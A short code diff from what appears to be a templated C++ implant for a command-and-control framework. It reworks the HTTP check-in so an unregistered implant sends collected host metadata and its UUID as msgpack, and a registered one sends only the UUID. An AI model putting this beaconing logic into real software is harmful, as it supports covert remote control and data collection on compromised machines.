@@ -39,18 +39,26 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     std::string http_response_buffer;
 
     // Prep metadata as plaintext/unobsfucated
-    std::map<std::string, std::string> metadata_map;
-    metadata_map["implant_uuid"] = implant_uuid;
-
     int registered = SettingsManager::instance().get<int>("registered",0);
+    std::vector<uint8_t> metadata_as_msgpack;
+
+    //if not registered, send our init metdata back. 
     if (registered == 0) {
-        //only send metadata if not registered, which keeps traffic size low. 
-        populate_metadata(metadata_map);
+        std::cout << "NOT REG< METADATA SEND" << std::endl;
+        //only send metadata on init
+
+        //returns a nholmann::json
+        nlohmann::json _metadata = populate_metadata();
+        _metadata["implant_uuid"] = implant_uuid;
+        metadata_as_msgpack = nlohmann::json::to_msgpack(_metadata);
     }
 
-    //create the msgpack rep of metadata
-    std::vector<uint8_t> metadata_as_msgpack;
-    create_metadata(metadata_map, metadata_as_msgpack);
+    //if already registered, just send back implant_uuid in metdata
+    else {
+        nlohmann::json _metadata;
+        _metadata["implant_uuid"] = implant_uuid;
+        metadata_as_msgpack = nlohmann::json::to_msgpack(_metadata);
+    }
 
     // Hold bytes in a string container, as all the transforms want a string
     // do NOT change the `metadata` var name prior to templating, it's needed for it
